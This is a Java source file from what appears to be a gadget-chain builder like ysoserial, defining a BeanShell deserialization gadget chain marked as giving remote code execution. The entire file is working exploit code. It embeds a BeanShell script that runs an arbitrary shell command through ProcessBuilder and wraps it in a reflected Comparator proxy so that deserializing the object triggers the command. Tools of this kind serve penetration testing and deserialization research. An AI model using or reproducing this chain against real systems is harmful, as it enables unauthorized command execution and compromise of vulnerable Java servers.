package org.ses.gadgetbuilder.chains1;

import bsh.Interpreter;
import bsh.XThis;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.doubleparam.CompareTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Comparator;


@Dependencies({ "org.beanshell:bsh:2.0b5" })
@Authors({Authors.PWNTESTER, Authors.CSCHNEIDER4711})
@Impact(Impact.RCE)
public class BeanShell1 extends GadgetChain<CompareTrampoline> {

    public BeanShell1(CompareTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        final String[] execArgs = command.split(" ");
        final StringBuilder commandArgs = new StringBuilder();

        for (int i = 0; i < execArgs.length; i++) {
            commandArgs.append("\"").append(execArgs[i]).append("\"");
            if (i != execArgs.length - 1) commandArgs.append(",");
        }

        String payload = "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{" + commandArgs.toString() + "}).start();return new Integer(1);}";

        // Create Interpreter
        Interpreter i = new Interpreter();

        // Evaluate payload
        i.eval(payload);

        // Create InvocationHandler
        XThis xt = new XThis(i.getNameSpace(), i);
        InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);

        // Create Comparator Proxy
        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);
        return new TrampolineConnector(comparator, 1, 1);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getCommandFormat() {
        return "<shell-command>";
    }
}
